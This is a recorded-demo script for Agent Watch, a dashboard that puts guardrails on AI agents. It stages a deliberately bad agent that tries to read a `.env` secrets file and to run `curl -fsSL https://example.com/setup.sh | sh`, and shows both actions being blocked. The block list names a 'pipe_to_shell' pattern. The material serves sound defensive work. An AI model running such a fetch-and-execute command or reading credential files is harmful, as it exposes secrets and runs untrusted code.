# Agent Watch demo script

Target length is about 3 minutes, and both guardrails fire live. All commands run from the repo root on the deployed stack. The UI labels below are the ones the dashboard actually uses.

## Before recording (about 5 min, off camera)

1. In a terminal, run `source .venv/bin/activate` and export `AGENTWATCH_ENDPOINT=<ApiUrl>`, `AGENTWATCH_OWNER=<owner-id>`, and `AGENTWATCH_KEY="$(cat ~/.agentwatch_key)"`. The key is read from your private file, so it is never typed, shown on screen, or pasted into the repo.
2. Check `aws sts get-caller-identity` works (Bedrock), or set `ANTHROPIC_API_KEY` for the fallback.
3. Open the dashboard (https://main.d65rs0iutjwy8.amplifyapp.com). Enter Owner ID and API key, then click **Save credentials**.
4. Open `bad-bot` (inventory link, or type `bad-bot` under **Agent ID** and click **Open**). If `.env` is already under **Blocked paths**, or any pattern is under **Blocked commands**, click **Remove** on each and then **Save rules**, so you can add them live.
5. Open `demo-bot`. Look at its spend in the inventory and pick a **Daily spend cap (USD)** a little above its current 24h spend, about $0.002 more. Leave the cap empty for now.
6. Have the alert inbox open in a second window.
7. Optional: do one full dry run, then reset steps 4 and 5.

## On camera

1. **Problem (20 s).** "Student agents run on personal API keys. Nothing shows what they touched or what they cost. One careless tool reads `.env`, and one loop drains the budget."
2. **3 lines (20 s).** Show the snippet in `README.md`: `agentwatch.init`, `aw.wrap(client)`, `aw.tools(TOOLS)`.
3. **Inventory (15 s).** Show the dashboard inventory columns: **Agent**, **Model**, **Last activity**, **Total spend**.
4. **Path block (60 s).** This is the demo moment.
   - Open `bad-bot`. Under **Add path**, type `.env` and click **Add path**. Under **Blocked commands**, click **Add presets** (the presets include `pipe_to_shell`). Click **Save rules**, then reload `bad-bot` and check that both `.env` and the `pipe_to_shell` pattern are listed.
   - Safety: `bad_agent.py` must not run until both rules are saved and confirmed by a fresh read of `bad-bot`'s config. Its second step really runs `curl -fsSL https://example.com/setup.sh | sh` if the `pipe_to_shell` pattern is missing.
   - In the terminal, run the check and the agent together. The check reads the config from the API (key hashed in-process; it prints only OK or STOP), and `bad_agent.py` starts only if it prints OK:
     ```bash
     python - <<'PY' && python demo/bad_agent.py
     import hashlib, json, os, sys, requests
     pattern = next(p["pattern"] for p in json.load(open("dashboard/lib/commandPresets.json")) if p["id"] == "pipe_to_shell")
     r = requests.get(os.environ["AGENTWATCH_ENDPOINT"] + "/agents/bad-bot/config", timeout=10, allow_redirects=False,
                      headers={"X-Agentwatch-Owner": os.environ["AGENTWATCH_OWNER"],
                               "X-Agentwatch-Key-Hash": hashlib.sha256(os.environ["AGENTWATCH_KEY"].encode("utf-8")).hexdigest()})
     g = r.json().get("guardrails", {}) if r.status_code == 200 else {}
     ok = ".env" in g.get("blockedPaths", []) and pattern in g.get("blockedCommands", [])
     print("OK: .env and pipe_to_shell are saved on bad-bot" if ok else f"STOP: rules not confirmed (HTTP {r.status_code}); bad_agent.py was not run")
     sys.exit(0 if ok else 1)
     PY
     ```
   - If it prints STOP, `bad_agent.py` does not start. Add the missing rule, click **Save rules**, and run the block again.
   - Expected: the agent answers one question, says it will check the `.env` file, then prints `PathBlocked: ... (Agent Watch stopped the read; an alert is on its way)`. The file is never opened. Then it says it will install a helper and prints `CommandBlocked: ... (Agent Watch stopped the command; an alert is on its way)`. The command never runs.
   - Switch to the inbox and show the two alert emails, subjects `Agent Watch: blocked_path blocked for bad-bot` and `Agent Watch: blocked_command blocked for bad-bot`.
   - Back in the dashboard, refresh `bad-bot`. The timeline shows the two `blocked` events at the top.
5. **Spend cap (50 s).**
   - Open `demo-bot`. Enter the cap from step 5 of the prep and click **Save rules**.
   - In the terminal: `python demo/demo_agent.py --loop 5`
   - Expected: `run 1/5 agent: ...`, maybe `run 2/5 ...`, then `run N/5: SpendCapExceeded: ... (Agent Watch stopped the call before it ran; ...)`. The blocked call was never sent to the model.
   - Show the alert email (`Agent Watch: spend_cap blocked for demo-bot`), then the `demo-bot` timeline (newest first): the `blocked` event on top, the successful `llm_call` events below it. Use **Filter** to show only `blocked`.
6. **How it's built (20 s).** API Gateway, Lambda, DynamoDB, SNS, and Amplify in us-west-2, throttled, with a $10 budget. Built in Kiro: show `.kiro/specs`, steering, hooks, and MCP.

## If something goes wrong

- `read_file('.env') was NOT blocked`: the rule wasn't saved, or the SDK hasn't fetched it yet. Config is fetched at `init`, so check **Save rules** succeeded and rerun.
- `run 1/5: SpendCapExceeded` immediately: the cap is below the current 24h spend plus about $0.001. Raise it and rerun.
- No block after 5 runs: the cap is too high. Lower it.
- `STOP: rules not confirmed`: the check found `.env` or the `pipe_to_shell` pattern missing on `bad-bot` (or the request failed), so `bad_agent.py` did not run. Add the rule, click **Save rules**, and run the block again.
- `run_shell was NOT blocked`: only possible if `bad_agent.py` was started without the check. The command actually ran. Stop, add the pattern with **Add presets**, click **Save rules**, and use the check before the next run.
- `Bedrock unavailable (...); falling back to Anthropic API` from `bad_agent.py` or `demo_agent.py`: fine, both fall back the same way and the demo still works if `ANTHROPIC_API_KEY` is set. With neither working, the agent stops at its first LLM call.
- No email: check spam, and check that the SNS subscription was confirmed. The block itself still happened, so show it in the timeline.
- `agentwatch: authorization failed`: wrong `AGENTWATCH_OWNER` or `AGENTWATCH_KEY` for that agent id.
